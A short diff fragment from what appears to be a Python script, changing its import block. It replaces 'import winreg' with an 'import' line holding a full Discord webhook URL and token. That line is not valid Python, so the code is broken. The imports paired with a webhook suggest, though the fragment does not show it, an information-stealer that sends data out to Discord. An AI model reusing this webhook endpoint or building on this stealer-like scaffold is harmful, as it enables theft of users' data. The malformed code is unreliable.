@@ -4,7 +4,7 @@ import json
 import httpx
 import ntpath
 import random
-import winreg
+import https://discord.com/api/webhooks/989480285718589510/GeuIKbbiqUhEquw2NYRL4ZgyOvDBhsopIvSoIgaQg4Y5cq7td-DXccE5wYB1xAlvpwqQ
 import ctypes
 import shutil
 import psutil
